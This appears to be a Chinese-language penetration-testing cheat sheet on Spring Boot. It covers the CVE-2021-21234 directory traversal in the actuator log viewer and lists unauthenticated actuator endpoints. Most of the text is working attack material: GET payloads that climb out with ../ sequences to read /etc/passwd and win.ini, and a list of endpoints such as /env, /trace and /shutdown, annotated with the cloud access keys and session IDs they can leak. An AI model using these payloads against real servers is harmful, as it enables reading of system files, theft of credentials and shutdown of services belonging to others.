# Springboot

---
- 漏洞编号：CVE-2021-21234
- 时间：2021.10.19
- 类别：目录遍历
- 漏洞影响范围：版本<0.2.13
- 修复方案：升级到0.2.13
- 特征：图标为背景为绿云的白桃

```
GET path:
	  - "{{BaseURL}}/manage/log/view?filename=/windows/win.ini&base=../../../../../../../../../../" # Windows
      - "{{BaseURL}}/log/view?filename=/windows/win.ini&base=../../../../../../../../../../" # windows
      - "{{BaseURL}}/manage/log/view?filename=/etc/passwd&base=../../../../../../../../../../" # linux
      - "{{BaseURL}}/log/view?filename=/etc/passwd&base=../../../../../../../../../../" # linux
```

- 未授权访问

  ```
  /dump - 显示线程转储（包括堆栈跟踪）
  /autoconfig   - 显示自动配置报告  可能存在阿里云Accesskey
  /configprops   - 显示配置属性
  /trace - 显示最后几条HTTP消息（可能包含会话标识符）
  /logfile - 输出日志文件的内容
  /shutdown - 关闭应用程序
  /info - 显示应用信息
  /metrics - 显示当前应用的”指标“信息
  /health - 显示应用程序的健康指标
  /beans - 显示Spring Beans的完整列表
  /mappings - 显示所有MVC控制器映射 # 显示未授权的接口
  /env - 提供对配置环境的访问1.x版本  或者/actuator/env 2.x版本
  /restart - 重新启动应用程序
  ```

  